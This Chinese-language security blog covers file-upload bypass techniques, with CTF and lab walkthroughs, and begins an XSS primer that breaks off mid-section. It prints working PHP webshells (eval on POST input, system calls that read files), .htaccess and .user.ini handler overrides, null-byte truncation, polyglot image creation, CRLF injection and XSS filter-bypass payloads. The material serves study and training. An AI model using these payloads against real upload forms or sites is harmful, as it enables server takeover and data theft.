原理Web应用系统虽然对用户上传的文件进行了校验，但是校验是通过前端javascript代码完成的。由于恶意用户可以对前端javascript进行修改或者是通过抓包软件篡改上传的文件，就会导致基于js的校验很容易被绕过。
如何判断当前页面使用前端is的验证方式
   前端验证通过以后，表单成功提交后会通过浏览器发出─条网络请求，但是如果前端验证不成功，则不会发出这项网络请求;可以在浏览器的网络元素中查看是否发出了网络请求。

绕过方法
删除或者禁用js:火狐浏览器--&gt;about:config--&gt;JavaScriptenable-false (ajax)
使用代理上传文件，Burp Suite;上传符合要求的文件类型，抓包修改文件类型。
直接删除代码中onsubmit事件中关于文件上传时验证上传文件的相关代码即可或者可以不加载所有js，还可以将html源码copy一份到本地，然后对相应代码进行修改，本地提交即可。

CTFHub-web-文件上传-前端验证首先查看源码发现发现只允许jpg等几种后缀名文件通过，所以先将所要上传的文件后缀名改为jpg形式进行上传，中途用bp抓包，如下：

将filename改为test.php，然后发送：

发现文件上传成功，然后打开蚁剑进行连接，获取到flag文件，打开即可看到flag
绕过Content-Disposition在常规 HTTP 响应中 Content-Disposition ，响应标头是一个标头，指示内容是应在浏览器中以内联方式显示，即作为网页或网页的一部分，还是作为附件在本地下载和保存（这操作当然是在文件成功上传后，但是你无法通过正常的途径去访问）
举个例子：Content-Disposition: attachment; filename=&quot;filename.jpg&quot;
上述响应Content-Disposition 的属性 attachment 表示告诉浏览器将内容作为附件下载。另外，filename=&quot;filename.jpg&quot; 指定了下载的文件名为 filename.jpg
为了让我们的文件可以传上去，而不是被下载下来，我们可以用CRLF漏洞来进行绕过，即在我们可控的响应头内输入 \r\n\r\n或者是将其编码后的 %0d%0a%0d%0a，举个例子，如果说报头中的Content-Type可控，那么我们在后面键入text/html\r\n\r\n，就可以实现绕过，这是由于注入的回车符和换行符导致浏览器将 content-disposition 标头解释为 HTTP 正文的一部分，因此被忽略为告诉浏览器下载的指令，当然，使用 %00也可以达到相同的效果，下面我们来自己测试一下：
&lt;?php//highlight_file(__FILE__)$filename = $_GET[&#x27;file&#x27;];$fileheader = $_GET[&#x27;header&#x27;];$filetype = $_GET[&#x27;type&#x27;];if(isset($filetype)&amp;isset($fileheader)&amp;isset($filename))&#123;    header(&#x27;Content-Type:&quot;&#x27;.$filetype.&#x27;&quot;&#x27;);    header(&#x27;Content-Disposition:attachment;filename=&quot;&#x27;.$fileheader.&#x27;&quot;&#x27;);    readfile($filename);&#125;

正常在url后面输入?file=show.txt&amp;header=show.txt&amp;type=text/plain去访问的话会直接将文件下载下来，在hackbar或者bp里面自己访问的话并不会，然后如果我们输入?file=show.txt&amp;header=show.txt%0d%0a%0d%0a&amp;type=text/plain的话页面回显如下：
第一行的警告其实涉及到了php底层的c源码，如下：


我们试图往header里插入\r或者\n，会直接抛出异常，这一句直接失效，这其实是CRLF的另一种绕过姿势
当我们输入?file=show.txt&amp;header=show.txt%00&amp;type=text/plain时，页面回显如下

这第一行的警告里面也涉及到了php的底层c源码，如果是%00的话会抛出异常，如下

但是我们输入 ?file=show.txt&amp;header=show.txt&amp;type=text/plain%00的话，页面回显如下

那么为什么我们在type处输入%00，明明只是影响到Content Type的值，却还是把Content disposition给干掉了呢？这是因为第二个异常，通过搜索得知抛出第二个异常是因为header在执行的时候有任何数据被带到浏览器，而在这一数据就是指第一个异常，所以第二个header并不会执行
后端检测MIME检测什么是MIME MIME(Multipurpose Internet Mail Extensions)多用途互联网邮件扩展类型。是设定某种扩展名的文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会自动使用指定应用程序来打开。
常见的MIME类型text/plain （纯文本） 
text/html （HTML文档）
text/javascript （js代码）
application/xhtml+xml （XHTML文档）
image/gif （GIF图像） 
image/jpeg （JPEG图像）  
image/png （PNG图像） 
video/mpeg （MPEG动画）  
application/octet-stream （二进制数据） 
application/pdf （PDF文档）
检测方式在文件上传过程中，服务端会针对我们的上传的文件生成一个数组，这个数组其中有一项就是这个文件的类型file_type；服务端对文件进行检测时，就是通过检测脚本中的黑白名单和这个数组中的file_type进行对比，如果符合要求就允许上传这个文件。

MIME绕过的原理部分Web应用系统判定文件类型是通过content-type字段，黑客可以通过抓包，将content-type字段改为常见的图片类型，如image/gif，从而绕过校验。
CTFHub-web-文件上传-MIME检测首先上传php文件弹窗文件类型不正确，检查源码发现并没有相关js代码，所以应该是后端
文件上传途中进行抓包，将 content-type字段改为 image/gif，然后发送请求包，上传的文件名后缀不需要改变

文件上传成功，然后就可以启动蚁剑了，蚁剑的密码为$_POST里面的内容，上传的文件内容如下：
&lt;?phpeval($_POST[&quot;shell&quot;]);?&gt;

00截断原理虽然web应用做了校验，但是由于文件上传后的路径用户可以控制，攻击者可以利用手动添加字符串标识符0X00的方式来将后面的拼接的内容进行截断，导致后面的内容无效，而且后面的内容又可以帮助我们绕过黑白名单的检测。
条件
- php版本要小于5.3.4，5.3.4及以上已经修复该问题
- PHP的magic_quotes_gpc为OFF状态
- 用户可指定上传路径并且上传路径通过GET方式传参

绕过思路在C语言中，空字符有一个特殊含义，代表字符串的拼接结束。这里我们使用的是php语言，属于高级语言，底层靠C语言来实现的，也就是说空字符的字符串拼接结束功能在PHP中也能实现。但是我们在URL中不能直接使用空，这样会造成无法识别；我们通过查看ASCII对照表，发现ASCII对照表第一个就空字符，它对应的16进制是00，这里我们就可以用16进制的00来代替空字符，让它截断后面的内容。
使用burpsuite进行抓包，因为这里是通过URL进行传递的文件上传后存储路径，所以需要对16进制的00进行URL编码，编码的结果就是%00，通过这种方式，就可以%00截断后面的内容，让拼接的文件名不再进行生效
题目首先查看相关源码：
if (!empty($_POST[&#x27;submit&#x27;])) &#123;    $name = basename($_FILES[&#x27;file&#x27;][&#x27;name&#x27;]);    $info = pathinfo($name);    $ext = $info[&#x27;extension&#x27;];                //首先取到上传文件的扩展名$ext    $whitelist = array(&quot;jpg&quot;, &quot;png&quot;, &quot;gif&quot;);   //将扩展名与白名单进行匹配，为jpg、png或gif才能通过第一次过滤    if (in_array($ext, $whitelist)) &#123;        $des = $_GET[&#x27;road&#x27;] . &quot;/&quot; . rand(10, 99) . date(&quot;YmdHis&quot;) . &quot;.&quot; . $ext;   //扩展名匹配之后，为上传的文件构造了一个新的存储路径$des        if (move_uploaded_file($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;], $des)) &#123;            echo &quot;&lt;script&gt;alert(&#x27;上传成功&#x27;)&lt;/script&gt;&quot;;        &#125; else &#123;            echo &quot;&lt;script&gt;alert(&#x27;上传失败&#x27;)&lt;/script&gt;&quot;;        &#125;    &#125; else &#123;        echo &quot;文件类型不匹配&quot;;    &#125;&#125;

in_array($ext, $whitelist)：in_array($ext, $whitelist) 是 PHP 中用于检查一个值是否存在于数组中的函数。$ext 是要检查的值，$whitelist 是要检查的数组。如果 $ext 存在于 $whitelist 数组中，则该函数返回 true；否则返回 false
move_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;], $des)：

move_uploaded_file(): 这是 PHP 中用于将上传的文件移动到新位置的函数。它接受两个参数：源文件路径和目标文件路径。
$_FILES[&#39;file&#39;][&#39;tmp_name&#39;]: 这是上传文件在服务器上的临时存储路径。在 PHP 中，通过 $_FILES 超全局变量可以访问到上传的文件信息，其中 &#39;file&#39; 是表单中 &lt;input type=&quot;file&quot;&gt; 控件的 name 属性值，&#39;tmp_name&#39; 表示上传文件的临时存储路径。
$des: 这是目标文件的路径，是之前代码中生成的文件路径。它是目标位置，上传的文件将被移动到这个位置。

根据上面的代码思路，首先我们把文件后缀名改为jpg形式，然后用bp抓个包然后修改get传参中的road值，如下所示：

上传成功，使用蚁剑获取到flag
POST传参保存路径与GET传参类似的的是：后端对文件路径的处理类似为
PHP$des = $_POST[&#x27;road&#x27;] . &quot;/对文件名的处理操作......&quot; . $ext;

此时road为我们可控的参数，但与GET传参不同的是，http请求内包含文件时，POST参数不再被自动解码，所以POST传参需要使用BP使用查看16进制的请求详情，修改一个十六进制的为00

步骤一：修改路径添加文件名，写入需要执行的代码语句

步骤二：切换为十六进制模式，修改所需要替换为00的位置

由于使用00截断，所以最后文件保存在/var/www/html/upload,名为test.php,根据位置，访问/upload/test.php,即进入我们所在的页面，可以看到PHP的配置信息，00截断成功
文件头检测漏洞原理在每一个文件（包括图片，视频或其他的非ASCII文件）的开头（十六进制表示）实际上都有一片区域来显示这个文件的实际用法，这就是文件头标志。我们可以通过16进制编辑器打开文件，添加服务器允许的文件头以绕过检测。
另一种方法就是用画图软件画一张简单的图，太复杂的话会报错，然后抓包在文件末尾添加php代码
常见的文件头注意：下面的文件头的格式是16进制的格式：
 GIF：47 49 46 38 39 61 png：89 50 4E 47 0D 0A 1A 0A JPG：FF D8 FF E0 00 10 4A 46 49 46
 在进行文件头绕过时，我们可以把上面的文件头添加到我们的一句话木马内容最前面，达到绕过文件头检测的目的
CTFHub 文件上传 - 文件头检测最开始上传一个.php后缀的文件，提交，alert()弹出一个窗口，只允许jpg,png,gif后缀提交，然后burpsuite抓包，把Content-type改为image&#x2F;png，然后发现还是上传不上去，有弹窗，发现有文件头检测
首先用画图工具做出一个最简单的图，太复杂的话会报错，然后上传，中途抓包修改数据如下：
报头中的文件后缀名要改回 php，然后发送请求包，成功
之后利用蚁剑获取到flag
内容检测图片马绕过漏洞原理一般文件内容验证使用getimagesize函数检测,会判断文件是否是一个有效的文件图片,如果是,则允许上传,否则的话不允许上传。  本实验就是将一句话木马插入到一个[合法]的图片文件当中,然后用webshell管理工具进行远程连接。
图片马制作准备一张图片，这里为a.png，和一个一句话木马，通过以下命令合成一个图片马3.php： a.php内容：
&lt;?php phpinfo(); ?&gt;

命令（用cmd，在文件所在的目录）：
copy a.png /b + a.php /a 3.php  /b:指定以二进制格式复制、合并文件，用于图像或者声音类文件/a:指定以ascii格式复制、合并文件用于txt等文本类文件

 注：这条命令的意思是：通过copy命令，把a.png图片文件，以二进制文件形式添加到a.php文件中，以ASCII文本文件形式输出为3.php文件。
解析图片马一般解析图片马需要结合解析漏洞或者文件包含才能解析图片马
常见漏洞.htaccess文件解析漏洞什么是.htaccess文件htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许&#x2F;阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能
漏洞利用前提 web具体应用没有禁止.htaccess文件的上传，同时web服务器提供商允许用户上传自定义的.htaccess文件。
原理 .htaccess文件(或者&quot;分布式配置文件&quot;) ,全称是Hypertext Access(超文本入口)。提供了针对目录改变配置的方法，即，在一个特定的文档目录中放置一个包含一个或多个指令的文件，以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。
利用方式一般.htaccess可以用来留后门和针对黑名单绕过
 上传覆盖.htaccess文件，重写解析规则，将上传的带有脚本木马的图片以脚本方式解析。
.htaccess文件内容.htaccess文件解析规则的增加，是可以按照组合的方式去做的，不过具体得自己多测试。
&lt;FilesMatch &quot;evil.gif&quot;&gt;SetHandler application/x-httpd-php   #在当前目录下，如果匹配到evil.gif文件，则被解析成PHP代码执行AddHandler php5-script .gif          #在当前目录下，如果匹配到evil.gif文件，则被解析成PHP代码执行&lt;/FilesMatch&gt;

或者是以下内容
AddType application/x-httpd-php .txt


这段 Apache 配置语法用于将指定扩展名的文件类型设置为 PHP 文件类型。

AddType: 这是 Apache 配置指令，用于将文件扩展名关联到指定的 MIME 类型。
application/x-httpd-php: 这是 MIME 类型的标识符，表示 PHP 文件类型。
.txt: 这是要关联的文件扩展名，表示文本文件

CTFHub 文件上传 - htaccess配置文件 .htaccess文件文件名只能是这个，但是在windows系统中不能够直接这样命名，文件名不能为空，从网上发现可以通过另一种方法来修改：开启cmd，切换到文件所在的目录，然后通过rename直接修改：rename 1.htaccess .htaccess
.user.ini漏洞php.ini是php的一个全局配置文件，对整个web服务起作用；而.user.ini和.htaccess一样是目录的配置文件，.user.ini就是用户自定义的一个php.ini，我们可以利用这个文件来构造后门和隐藏后门。 但是这种方式其实是有个前提的，因为.user.ini只对他同一目录下的文件起作用，也就是说，只有他同目录下有php文件才可以。
.user.ini文件内容：auto_append_file=filename在木马文件上传后上传或者auto_prepend_file=filename在木马文件上传前上传

ctfshow-web153url上输入 &#x2F;upload，网页显示了nothing here表示可以用配置文件（因为upload目录下有php文件）
为了利用auto_append_file，我们首先上传.user.ini内容为 auto_append_file&#x3D;“xxx” xxx为我们上传的文件名，接着上传一个带木马的图片 因为upload有index.php，所以这个php就会添加一个include(“shell.png”)，就会包含到木马,这样就在每个php文件上包含了我们的木马文件
构造两个文件内容如下：
.user.ini.png内容：  auto_prepend_file=&quot;shell.png&quot;shell.png &lt;?php @eval($_POST[&#x27;shell&#x27;]);?&gt;

开始做题：先上传.user.ini.png文件，并抓包，修改名称：.user.ini，然后放包


接着再上传图片马，最后就可以用蚁剑连接 /upload/，然后获取到flag
ctfshow-web154&amp;155首先按照上题步骤上传 .user.ini文件成功，然后上传图片马失败，根据题解说是过滤了php，于是可以试试短标签，如下：
可用使用&lt;?=(表达式)?&gt;进行绕过，&lt;?=(表达式)?&gt;  等价于 &lt;?php echo (表达式)?&gt; 

于是图片内容变为：&lt;?=eval($_POST[shell]);?&gt;，上传成功，用蚁剑连接一下 /upload/，然后获取到flag
ctfshow-web156首先按照上题步骤上传 .user.ini文件成功，然后上传图片马失败，自己测试实在没有发现过滤了什么，看了提及人后才明白过滤掉了[]，在php中查看数组也可以用{}，所以只要把图片马内容中的[]全部改成{}，然后再上传就可以了
ctfshow-web157&amp;158[] &#123;&#125;, ; 都被过滤了，导致不能使用蚁剑来进行连接，所以我们直接远程代码执行
首先按照上面几题一样先上传 .user.ini文件，然后先上传图片马内容为：&lt;?=system(&#39;ls ../&#39;)?&gt;查看到flag的位置，因为php也被禁止掉了，所以我们可以使用通配符???或者*来代替php，内容为：&lt;?=system(&#39;cat ../flag.*|base64&#39;)?&gt;，再拿去base64解码后就可以得到flag了
Apache解析漏洞此漏洞实际为人为的错误配置导致的漏洞，与Apache本身无关
Apache对多后缀文件的识别概括来说为：

Apache允许文件有多个扩展名，并且会将所有后缀名进行识别，识别的顺序为：从右到左

如： .html.fr 映射到 Content-Type: text/html 和Content-Language: de。


Apache允许扩展名映射到元数据(包括：语言、内容类型、字符集或编码)、处理程序。

如 .html 映射到 Content-Type: text/html。


对于相同类型元数据，以从右到左第一个出现的为准，但对于语言和内容编码可累积的元数据，将会叠加
如：.gif.html根据此规则映射到 Content-Type: text/html。
 .html.en.de根据此规则映射到Content-Language: en, de 和 Content-Type: text/html

由于映射到处理程序和映射媒体类型，最后的返回结果不一致（一个为经过程序处理，一个为返回媒体文件）。当出现不同扩展名映射到处理程序和媒体类型时，映射到处理程序的优先等级高于映射到媒体类型
如：.imap.html扩展名.imap 映射到处理程序 imap-file， .html 映射到Content-Type: text/html ，根据上述原则，.imap.html文件会被imap-file程序处理


使用 Add* 指令，Apache处理一个文件时会应用上述规则
Add* 指令指的是如：AddType、AddDefaultCharset、AddEncoding、AddHandler、AddOutputFilter、AddLanguage、AddCharset等指令，其中AddHandler设置对应后缀名映射到处理程序，如：
AddHandler application/x-httpd-php .php

由此，当用户上传一个a.php.jpg文件时，Apace的配置文件中包含AddHandler处理PHP文件，且未对上传后的文件进行重命名，此时a.php.jpg被解析为一个PHP脚本，解析漏洞由此而来
解析配置漏洞条件
文件没有被重命名
Apache中配置中含有AddHandler的设置

解析配置漏洞解决办法
将上传的文件进行重命名
根据官方文档的说明，可以使用SetHandler指令来代替AddHandler，因为SetHandler仅根据最右端的后缀名来判断映射的处理程序

影响版本 apache 1.x  apache 2.2.x
IIS6.0解析漏洞IIS6.0解析漏洞分两种：  1、目录解析： 以xx.asp命名的文件夹里的文件都将会被当成ASP文件执行。  2、文件解析： xx.asp;.jpg 像这种畸形文件名在;后面的直接被忽略，也就是说当成xx.asp文件执行。
 IIS6.0 默认的可执行文件除了asp还包含这三种 .asa .cer .cdx。
IIS7.0 | IIS7.5 | Nginx的解析漏洞原理
 Nginx拿到文件路径（更专业的说法是URI）/test.jpg/test.php后，一看后缀是.php，便认为该文件是php文件，转交给php去处理。php一看/test.jpg/test.php不存在，便删去最后的/test.php，又看/test.jpg存在，便把/test.jpg当成要执行的文件了，又因为后缀为.jpg，php认为这不是php文件，于是返回Access denied。   这其中涉及到php的一个选项：cgi.fix_pathinfo，该值默认为1，表示开启。开启这一选项PHP可以对文件路径进行修理。 

举个例子，当php遇到文件路径&#x2F;1.jpg&#x2F;2.txt&#x2F;3.php时，若&#x2F;1.jpg&#x2F;2.txt&#x2F;3.php不存在，则会去掉最后的&#x2F;3.php，然后判断&#x2F;1.jpg&#x2F;2.txt是否存在，若存在，则把&#x2F;1.jpg&#x2F;2.txt当做文件&#x2F;1.jpg&#x2F;2.txt&#x2F;3.php，若&#x2F;1.jpg&#x2F;2.txt仍不存在，则继续去掉&#x2F;2.txt，以此类推。
漏洞形式www.xxxxx.com/UploadFiles/image/1.jpg/1.php

另外两种解析漏洞www.xxxxx.com/UploadFiles/image/1.jpg%00.php` `www.xxxxx.com/UploadFiles/image/1.jpg/%20\0.php

条件竞争漏洞条件竞争漏洞是一种服务器端的漏洞，由于服务器端在处理不同用户的请求时是并发进行的，因此，如果并发处理不当或相关操作逻辑顺序设计的不合理时，将会导致此类问题的发生。
上传文件源代码里没有校验上传的文件，文件直接上传，上传成功后才进行判断：如果文件格式符合要求，则重命名，如果文件格式不符合要求，将文件删除。 
由于服务器并发处理(同时)多个请求，假如a用户上传了木马文件，由于代码执行需要时间，在此过程中b用户访问了a用户上传的文件，会有以下三种情况： 
1.访问时间点在上传成功之前，没有此文件。 
2.访问时间点在刚上传成功但还没有进行判断，该文件存在。 
3.访问时间点在判断之后，文件被删除，没有此文件。
二次渲染漏洞二次渲染原理 在我们上传文件后，网站会对图片进行二次处理（格式、尺寸要求等），服务器会把里面的内容进行替换更新，处理完成后，根据我们原有的图片生成一个新的图片并放到网站对应的标签进行显示。
绕过1、配合文件包含漏洞：  将一句话木马插入到网站二次处理后的图片中，也就是把一句话插入图片在二次渲染后会保留的那部分数据里，确保不会在二次处理时删除掉。这样二次渲染后的图片中就存在了一句话，在配合文件包含漏洞获取webshell。  2、可以配合条件竞争：  这里二次渲染的逻辑存在漏洞，先将文件上传，之后再判断，符合就保存，不符合删除，可利用条件竞争来进行爆破上传
如何判断图片是否进行了二次处理对比要上传图片与上传后的图片大小，使用16进制编辑器打开图片查看上传后保留了哪些数据，查看那些数据被改变。
利用文件上传实现日志包含从而连接蚁剑bp实战Lab：通过 Web Shell 上传远程执行代码题目要求：请上传一个基本的 PHP Web Shell 并使用它来泄露文件 /home/carlos/secret 的内容。使用实验室横幅中提供的按钮提交此机密
首先我们先登录账号，发现有个头像图片上传功能，开启proxy插件，先上传一个正常的图片，然后到代理模块中的http历史记录，选中/my-account/avatar条目发送到重放器中，然后更改过滤器配置如下：

应用发现多了一条目，是显示图片的，也发送到重放器中
第一个文件修改成如下内容：

然后第二个文件更改一下filename，再发送一遍，便得到了所需要的机密
Lab：通过绕过 Content-Type 限制上传 Web shell和上题不一样的地方就是多了对Conten-Type的检查，要求必须是图片类型的才可以
其余的操作步骤与上题一致，需要注意的是eval函数里面直接接语句的话要有双引号包括才可以
Lab：通过路径遍历进行Web shell上传要求：该实验室包含一个存在漏洞的图像上传功能。服务器被配置为阻止执行用户提供的文件，但可以通过利用第二个漏洞来绕过此限制。要完成该实验，请上传一个基本的 PHP Web shell 并使用它来窃取文件 /home/carlos/secret 的内容。使用实验室横幅中提供的按钮提交此机密
首先如果我们直接按照前两题的步骤来做该题的话，会发现页面会直接回显给我们输入的代码内容，并不会执行
发现上传图片的模块中的filename可以随意修改，所以我们尝试给该文件换个地方，如下：

发现我们输入的被直接处理掉了
再尝试一下进行url编码试试，如下：
成功上传该文件，于是我们去访问一下该文件，结果如下：
拿到机密，题目解决
Lab：通过扩展黑名单绕过上传Web shell正常上传一个文件后，我们将其改为php后缀的文件再次进行上传，发现页面会回显不允许php后缀的文件上传
于是尝试将后缀名改为.php4，成功上传，但发现页面会直接回显给我们输入的代码内容，并不会执行该代码
这时候我想到了可以通过上传.user.ini文件来进行绕过，于是进行尝试，但是发现页面还是直接回显输入的代码内容（不知道为什么行不通）。万幸我们还有另一种方法，可以通过上传.htaccess来绕过，该文件具体内容如下：
AddType application/x-httpd-php .txt

后缀为.txt的文件都会被当作php代码执行，于是我们上传

然后bp访问该url，得到机密，解决题目
Lab：通过混淆的文件扩展名上传 Web shell最开始是想着按照上题的思路先上传一个.htaccess文件，但是上传失败，页面回显只允许后缀名为png或者jpg的文件上传
但是这题的filename我们是可以改的，所以这题我们可以尝试使用00截断来绕过，如下：

然后直接访问shell.php，得到机密，题目解决
Lab：通过多语言 Web Shell 上传远程执行代码题目中提到：尽管它会检查文件的内容以验证它是否是真正的图像，但仍然可以上传和执行服务器端代码。
说明后端会检查图片的内容，但是我们可以尝试做一个图片马
首先上传一张正常的图片，然后到bp的代理模块中的HTTP历史记录里面将显示图片的条目发送到重放器里面
接着在本机上面将一张图片和一份php代码文件合成图片马，如下：
命令（用cmd，在文件所在的目录）：
copy a.png /b + a.php /a 3.php  /b:指定以二进制格式复制、合并文件，用于图像或者声音类文件/a:指定以ascii格式复制、合并文件用于txt等文本类文件

 注：这条命令的意思是：通过copy命令，把a.png图片文件，以二进制文件形式添加到a.php文件中，以ASCII文本文件形式输出为3.php文件。
接着将这份文件上传上去，并在bp中进行访问，得到我们所需要的机密，题目解决
借鉴超详细文件上传漏洞总结分析：https://cloud.tencent.com/developer/article/1938541
超详细文件上传漏洞总结分析
WELL’s blog
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
  </entry>
  <entry>
    <title>xss学习</title>
    <url>/2024/02/10/xss%E5%AD%A6%E4%B9%A0_max/xss%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[基础简介网站中包含大量的动态内容以提高用户体验，比过去要复杂得多。所谓动态内容，就是根据用户环境和需要，Web应用程序能够输出相应的内容。动态站点会受到一种名为“跨站脚本攻击”的威胁，而静态站点则完全不受其影响。恶意攻击者会在 Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的
xss漏洞通常是通过php的输出函数将javascript代码输出到html页面中，通过用户本地浏览器执行的，所以xss漏洞关键就是寻找参数未过滤的输出函数
分类反射型XSS：&lt;非持久化&gt;
 攻击者事先制作好攻击链接, 需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内容），一般容易出现在搜索页面。DOM型XSS由于危害较小，我们将其归为反射型XSS
存储型XSS：&lt;持久化&gt;
代码是存储在服务器中的，如在个人信息或发表文章等地方，加入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，每当有用户访问该页面的时候都会触发代码执行，这种XSS非常危险，容易造成蠕虫，大量盗窃cookie(虽然还有种DOM型XSS，但是也还是包括在存储型XSS内)
dom型与反射型的区别：
在dom型中输入的内容并不会出现在响应体里面（源码里面也不会）
响应体是我的输入会经过后端，经过后端渲染后再返回到前端；dom型是直接通过前端的js代码把我的输入插入到页面中进行实时渲染，这个时候并不是后端反应给我的，dom型没有向后端发起任何请求，而按F12可以看到输入的内容插入到源码中是因为其返回的是实时渲染的结果
补充js伪协议：就是把javascript: :后面的代码当JavaScript来执行

使用htmlspecialchars函数把预定义的字符&amp;、”、 ’、&lt;、&gt;转换为HTML实体，防止浏览器将其作为HTML元素
但是默认是只编码双引号的，而且单引号无论如何都不转义。
预定义的字符是：
- &amp; （和号）成为 &amp;amp;- &quot; （双引号）成为 &amp;quot;- &#x27; （单引号）成为 &#x27;- &lt; （小于）成为 &amp;lt;- &gt; （大于）成为 &amp;gt;

CRLF注入漏洞这也就牵扯到CRLF漏洞了
在 HTTP 协议中，CRLF 被用来分隔 HTTP 请求和响应中的各个部分。
CRLF 是回车符（carriage return，CR）和换行符（line feed，LF）的缩写，它们通常被一起使用来表示一行的结束。CRLF 漏洞（也称为 HTTP 报头注入漏洞）是一种 Web 应用程序安全漏洞，攻击者可以利用这个漏洞向 HTTP 响应中注入任意的 HTTP 头或者响应体，一般攻击者可以通过在输入中注入 CRLF 字符来改变 HTTP 响应的内容，从而实现恶意操作。
比如有一个搜索关键词的网站利用GET的形式传参
exp:?key=aaa

如果该网站存在CRLF漏洞，那么我们就可以利用回车符&#x2F;换行符进行绕过过滤
?key=%0d%0a%0d%0a&lt;img src=1 onerror=alert(1)&gt;

我们抓一下包看一下返回包
HTTP/1.1 200 OKDate:xxxxxxxxxxContent-type:text/htmlContet-Length:xxxConnection:closeLocation:&lt;img src=1 onerror=alert(/xss/)&gt;

浏览器会根据第一个CRLF把HTTP包分成header和body，然后将体显示出来。于是我们这里这个标签就会显示出来，造成一个XSS
浏览器的Filter是浏览器应对一些反射型XSS做的保护策略，当url中含有XSS相关特征的时候就会过滤掉不显示在页面中，所以不能触发XSS。
怎样才能关掉filter？一般来说用户这边是不行的，只有数据包中http头含有X-XSS-Protection并且值为0的时候，浏览器才不会开启filter。
我们可以将X-XSS-Protection:0注入到数据包中，再用两个CRLF来注入XSS代码，这样就成功地绕过了浏览器filter，并且执行我们的反射型XSS
绕过姿势拼接绕过eval
&lt;img src=&quot;x&quot; onerror=&quot;eval(&#x27;al&#x27;+&#x27;ert(Evi1s7)&#x27;)&quot;&gt;

top
&lt;img src=&quot;x&quot; onerror=&quot;top[&#x27;al&#x27;+&#x27;ert&#x27;](Evi1s7)&quot;&gt;

window
&lt;img src=&quot;x&quot; onerror=&quot;window[&#x27;al&#x27;+&#x27;ert&#x27;](1)&quot;&gt;

self
&lt;img src=&quot;x&quot; onerror=&quot;self[`al`+`ert`](1)&quot;&gt;

parent
&lt;img src=&quot;x&quot; onerror=&quot;parent[`al`+`ert`](1)&quot;&gt;

frames
&lt;img src=&quot;x&quot; onerror=&quot;frames[`al`+`ert`](1)&quot;&gt;

函数替换&lt;img src=&quot;x&quot; onerror=&quot;eval(alert(1))&quot;&gt;&lt;img src=&quot;x&quot; onerror=&quot;open(alert(1))&quot;&gt;&lt;img src=&quot;x&quot; onerror=&quot;document.write(alert(1))&quot;&gt;&lt;img src=&quot;x&quot; onerror=&quot;setTimeout(alert(1))&quot;&gt;&lt;img src=&quot;x&quot; onerror=&quot;setInterval(alert(1))&quot;&gt;&lt;img src=&quot;x&quot; onerror=&quot;Set.constructor(alert(1))&quot;&gt;&lt;img src=&quot;x&quot; onerror=&quot;Map.constructor(alert(1))&quot;&gt;&lt;img src=&quot;x&quot; onerror=&quot;Array.constructor(alert(1))&quot;&gt;&lt;img src=&quot;x&quot; onerror=&quot;WeakSet.constructor(alert(1))&quot;&gt;&lt;img src=&quot;x&quot; onerror=&quot;constructor.constructor(alert(1))&quot;&gt;&lt;img src=&quot;x&quot; onerror=&quot;[1].map(alert(1))&quot;&gt;&lt;img src=&quot;x&quot; onerror=&quot;[1].find(alert(1))&quot;&gt;&lt;img src=&quot;x&quot; onerror=&quot;[1].every(alert(1))&quot;&gt;&lt;img src=&quot;x&quot; onerror=&quot;[1].filter(alert(1))&quot;&gt;&lt;img src=&quot;x&quot; onerror=&quot;[1].forEach(alert(1))&quot;&gt;&lt;img src=&quot;x&quot; onerror=&quot;[1].findIndex(alert(1))&quot;&gt;

以上只是利用&lt;img&gt;标签进行举例，也可以在别的标签中使用
嵌套绕过&lt;sc&lt;script&gt;ript&gt;alert(&#x27;Evi1s7&#x27;)&lt;/sc&lt;/script&gt;ript&gt;

在这一段代码中，由于标签名被拆分成两部分，浏览器会将第一个尖括号视为标签名的起始符号，而第二个尖括号则是&lt;script&gt; 标签的起始符号，导致浏览器误以为有两个标签被嵌套在一起，从而实现我们的XSS攻击
url编码绕过需要注入点存在href属性或者src属性，才可以利用url编码转义
（注意在url解析过程中，不能对协议类型进行任何的编码操作）
&lt;a href=javascript:alert(1)&gt;Evi1s7&lt;/a&gt;#&lt;a href=javascript:%61%6c%65%72%74%28%31%29&gt;Evi1s7&lt;/a&gt;

scr和href属性1.src属性总的来说，src属性通常用于指定外部资源的URL，让浏览器从指定的URL中获取资源并加载它们。
&lt;script&gt;标签
src属性用于指定引入外部JavaScript文件的URL
&lt;img&gt;标签
src属性用于指定要显示的图像的URL
&lt;iframe&gt;标签
src属性用于指定要嵌入的另一个文档的URL。
&lt;audio&gt;和&lt;video&gt;标签
src属性用于指定要播放的音频或视频的URL
&lt;audio controls&gt;  &lt;source src=&quot;path/to/your/audio.mp3&quot; type=&quot;audio/mp3&quot;&gt;&lt;/audio&gt;&lt;video controls&gt;  &lt;source src=&quot;path/to/your/video.mp4&quot; type=&quot;video/mp4&quot;&gt;&lt;/video&gt;

2.href属性总的来说，href属性通常用于指定链接目标的URL或外部资源的URL，以及用于指定基准URL或图像地图中区域的URL。
&lt;a&gt;标签
href属性用于指定链接目标的URL。
&lt;link&gt;标签
href属性用于指定外部样式表的URL。
&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;path/to/your/stylesheet.css&quot;&gt;

&lt;base&gt;标签
href属性用于指定基准URL，所有相对URL都将以该URL为基础。
&lt;base href=&quot;https://www.example.com/&quot;&gt;&lt;a href=&quot;path/to/your/page.html&quot;&gt;Link Text&lt;/a&gt;

&lt;area&gt;标签
href属性用于指定图像地图中区域的URL。
&lt;img src=&quot;path/to/your/image.jpg&quot; alt=&quot;Your Image&quot; usemap=&quot;#your-map&quot;&gt;&lt;map name=&quot;your-map&quot;&gt;  &lt;area shape=&quot;rect&quot; coords=&quot;0,0,100,100&quot; href=&quot;path/to/your/page.html&quot;&gt;&lt;/map&gt;

()绕过1.利用反引号
